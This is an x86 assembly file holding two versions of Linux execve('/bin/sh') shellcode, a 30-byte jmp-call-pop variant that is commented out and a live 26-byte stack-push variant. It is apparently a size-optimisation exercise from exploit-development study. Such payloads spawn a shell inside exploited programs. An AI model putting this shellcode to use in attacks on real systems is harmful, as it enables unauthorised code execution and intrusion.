## 30 bytes
#.section .text
#.global _start
#
#_start:
#  jmp end
#begin:
#  popl %esi
#
#  xor %eax, %eax
#  pushl %eax
#  movl %esp, %edx # char *envp[]
#  pushl %esi
#  movl %esp, %ecx # char *argv[]
#  movb $0xb, %al # sys_execve()
#  movl %esi, %ebx # char *filename
#  int $0x80
#
#end:
#  call begin
#
#path:
#.ascii "/bin/sh\000"

# 26 bytes
.section .text
.global _start

_start:
  push $0x0068732f
  push $0x6e69622f
  mov %esp, %esi
  xor %eax, %eax
  pushl %eax
  movl %esp, %edx # char *envp[]
  pushl %esi
  movl %esp, %ecx # char *argv[]
  movb $0xb, %al # sys_execve()
  movl %esi, %ebx # char *filename
  int $0x80
